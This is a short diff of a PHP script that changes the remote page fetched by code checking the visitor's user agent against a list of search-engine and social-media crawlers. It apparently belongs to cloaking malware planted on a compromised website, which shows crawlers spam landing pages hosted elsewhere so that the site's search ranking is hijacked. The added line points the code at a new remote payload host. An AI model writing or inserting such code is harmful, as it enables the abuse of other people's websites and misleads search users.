@@ -31,7 +31,7 @@ function su($url) {
 }
 
 $res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "https://komandan-icarust.online/phb-majuterus-landing.html";
+$bot = "https://jictech-poltekkesjateng.pages.dev/sempakbasah/index.html";
 $file = su($bot);
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
 
